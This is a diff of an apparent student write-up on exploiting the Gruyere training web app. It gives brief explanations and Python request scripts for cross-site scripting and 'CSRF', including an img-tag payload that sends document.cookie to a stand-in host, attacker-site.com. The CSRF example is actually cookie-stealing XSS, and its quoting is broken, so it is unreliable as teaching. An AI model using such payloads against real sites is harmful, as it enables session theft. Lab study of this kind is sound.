@@ -5,6 +5,7 @@ Create code that can automatically exploit its documented vulnerabilities.
 How to execute an XSS attack- the payload variable contains a script tag with malicious JavaScript code. Problem arises if the server doesn't correctly/properly sanitize or encode the feedback parameter when rendering it in an HTML response. Consequence- script modified on the client side (XSS attack)
 
 **Python Code for Cross-Site Scripting**
+
 import requests  
 payload = "<script>alert('XSS Attack!');</script>" #Payload variable mentioned above- site of vulnerability 
 document_id = "your-document-id"
@@ -16,6 +17,7 @@ print(response.text)
 **Cross Site Request Forgery (CSRF)**-tricks you into performing actions (unknowingly) on a website you trust, using your already authenticated session. It achieves this using login cookies and after authentication, carries out the request made. This request is a CSRF attack and can be mitigated using anti-CSRF tokens.
 
 **Python Code for Cross-Site Request Forgery**
+
 import requests  
 payload = '<img src="http://attacker-site.com/steal?cookie=" + document.cookie + \'">\';' #Assigning a payload variable which contains malicious content in the form of html image tag sourced from the url shown.'document.cookie' is important as it stores the cookies associated with the web page the attacker wants to make a request to. 
 url = "http://gruyere-app.com/settings" #Target URL
